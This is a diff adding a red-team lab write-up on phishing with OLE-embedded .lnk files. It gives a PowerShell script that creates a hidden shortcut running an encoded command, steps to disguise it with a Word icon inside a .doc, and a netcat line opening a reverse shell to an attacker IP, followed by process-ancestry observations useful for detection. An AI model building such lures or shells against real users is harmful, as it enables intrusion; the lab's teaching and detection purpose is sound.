@@ -1,7 +1,17 @@
+---
+description: 'Phishing, Initial Access'
+---
+
 # Phishing: OLE + LNK
 
+This lab explores a popular phishing technique where attackers embed .lnk files and camouflage them with Ms Word office icon in .doc files to deceive victims to click the embedded file. Once clicked, the embedded file executes the malicious payload.
 
+## Weaponization
 
+Creating an .LNK file that will trigger the payload once executed:
+
+{% code-tabs %}
+{% code-tabs-item title="attacker@local" %}
 ```csharp
 $command = 'Start-Process c:\shell.cmd'
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
@@ -15,6 +25,60 @@ $link.iconlocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe"
 $link.arguments = "-Nop -sta -noni -w hidden -encodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAHMAaABlAGwAbAAuAGMAbQBkAA=="
 $link.save()
 ```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+Powershell payload will trigger a rudimentary NC reverse shell:
+
+{% code-tabs %}
+{% code-tabs-item title="c:\\shell.cmd" %}
+```csharp
+C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+Once the above powershell script is executed, an `.LNK` shortcut is created:
+
+![](../.gitbook/assets/ole-lnk-shortcut-created.png)
+
+Let's create a Word document that will contain the malicious shortcut that was created in the previous step:
+
+![](../.gitbook/assets/ole-good-document.png)
+
+Let's insert a new object into the document by selecting a `Package`and changing its icon source to a Microsoft Word executable:
+
+![](../.gitbook/assets/ole-insert-ole-object-with-icon.png)
+
+![](../.gitbook/assets/ole-change-icon.png)
+
+Point the package to the .lnk file containing the payload:
+
+![](../.gitbook/assets/ole-payload.png)
+
+Final result:
+
+![](../.gitbook/assets/ole-weaponized.png)
+
+## Execution
+
+Victim executing the embedded document. Gets presented with a popup to confirm execution:
+
+![](../.gitbook/assets/ole-execution.png)
+
+Confirms execution - note how the reverse shell came back to the attacker:
+
+![](../.gitbook/assets/ole-execution2.png)
+
+## Observations
+
+After the payload is triggered, the process ancestry looks as expected - powershell gets spawned by winword, cmd is spawned by powershell, etc.:
+
+![](../.gitbook/assets/ole-ancestry1.png)
+
+Soon after, the powershell gets killed and cmd.exe becomes an orphan:
+
+![](../.gitbook/assets/ole-ancestry2.png)
 
 {% file src="../.gitbook/assets/ole.ps1" caption="OLE+LNK Powershell Script" %}
 
